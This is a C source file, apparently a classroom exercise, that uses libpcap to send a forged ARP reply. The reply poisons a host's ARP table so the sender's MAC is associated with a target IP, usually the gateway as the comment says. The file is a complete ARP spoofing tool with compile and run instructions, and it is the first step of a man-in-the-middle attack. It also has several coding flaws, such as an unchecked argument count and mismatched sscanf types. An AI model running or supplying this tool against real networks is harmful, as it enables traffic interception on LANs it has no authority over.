#include<stdlib.h>
#include<stdio.h>
#include<arpa/inet.h>
#include<pcap.h>
#include<string.h>
#include<unistd.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<sys/stat.h>
#include<netinet/in.h>
#include<net/if.h>

//gcc -o send_arp send_arp.c -lpcap
//sudo ./send_arp <interface> <sender ip> <target ip>
//ex: sudo ./send_arp ens33 172.20.10.4 172.20.10.4(usually gateway)
struct eth_header{
	u_int8_t ether_dmac[6];
	u_int8_t ether_smac[6];
	u_int16_t ether_type;
};

struct arp_header{
	u_int16_t arp_htype;
	u_int16_t arp_ptype;
	u_int8_t arp_hsize;
	u_int8_t arp_psize;
	u_int16_t arp_opcode;
	u_int8_t arp_smac[6];
	u_int8_t arp_sip[4];
	u_int8_t arp_dmac[6];
	u_int8_t arp_dip[4];
};


unsigned char* getmymac(unsigned char *dev){
	int fd;
	unsigned char *mac;
	struct ifreq ifr;
	memset(&ifr,0,sizeof(ifr));
	fd=socket(AF_INET, SOCK_DGRAM,0);
	ifr.ifr_addr.sa_family= AF_INET;	
	strncpy(ifr.ifr_name,dev,IFNAMSIZ-1);
	
	if(0==ioctl(fd,SIOCGIFHWADDR,&ifr)){
		mac=(unsigned char*)ifr.ifr_hwaddr.sa_data;
	}
	close(fd);
	return mac;
}


void main(int argc, char **argv){
	pcap_t *fp;
	char errbuf[100];
	int i;
	unsigned char *mac;
	unsigned char broad_packet[100];
	unsigned char packet[100];
	struct eth_header broad_eth;
	struct arp_header broad_arp;
	struct pcap_pkthdr header;

	if(argc!=4){
		printf("usage: %s <interface> <sender ip> <target ip>",argv[0]);

	}
	if((fp= pcap_open_live(argv[1], 100, 1,1000,errbuf))==NULL){
		fprintf(stderr, "\n unable to open the adaptor.");
		return;
	}
	// broadcast to find sender mac 
	mac=getmymac(argv[1]);
	for(i=0;i<6;i++){
		broad_eth.ether_dmac[i]=0xff;
		broad_eth.ether_smac[i]=mac[i];
	}
	broad_eth.ether_type=0x0608;
	
	broad_arp.arp_htype=0x0100;/*set hardware type in arp*/
	broad_arp.arp_ptype=0x0008;/*set protocol type = ipv4*/ 
	broad_arp.arp_hsize=0x06;/*set hardware size*/
	broad_arp.arp_psize=0x04;/*protocol size*/
	broad_arp.arp_opcode=0x0100;/*set opcode(request or reply)*/
	for(i=0;i<6;i++){
		broad_arp.arp_smac[i] = mac[i];/*my smac*/
	}
	sscanf(argv[3], "%d.%d.%d.%d",&broad_arp.arp_sip[0],&broad_arp.arp_sip[1],&broad_arp.arp_sip[2],&broad_arp.arp_sip[3]); 
	for(i=0;i<6;i++){
		broad_arp.arp_dmac[i]=0x00;/*unknown dmac*/
	}
	sscanf(argv[2], "%d.%d.%d.%d",&broad_arp.arp_dip[0],&broad_arp.arp_dip[1],&broad_arp.arp_dip[2],&broad_arp.arp_dip[3]);/*sender ip to find smac*/

	memcpy(broad_packet,&broad_eth,sizeof(broad_eth));
	memcpy(broad_packet+sizeof(broad_eth),&broad_arp,sizeof(broad_arp));
	

	printf("broad packet : ");
	for(i=0;i<42;i++){
		printf("%02x ", broad_packet[i]);
	}
	printf("\n");

	if(pcap_sendpacket(fp,broad_packet, 100)!=0){
		fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
		return;
	}
	u_char* receive_packet;
	pcap_next_ex(fp,&header,&receive_packet);
	//arp table changing based on received packet
	memcpy(&packet,receive_packet+6,6); //receive smac == sender mac
	memcpy(&packet[6],receive_packet,6);
	memcpy(&packet[12],receive_packet+12,8); // ether type, size etc..
	packet[20]= 0x00;
	packet[21]= 0x02; //set reply opcode
	memcpy(&packet[22],receive_packet,6);
	memcpy(&packet[28],receive_packet+28,4);//target ip==sip
	memcpy(&packet[32],receive_packet+6,6);// sender mac
	memcpy(&packet[38],receive_packet+38,4);//sender ip==dip


	printf("sender packet : ");
	for(i=0;i<42;i++){
		printf("%02x ", packet[i]);
	}
	printf("\n");
	
	pcap_sendpacket(fp,packet,42);


	pcap_close(fp);
	return;
}

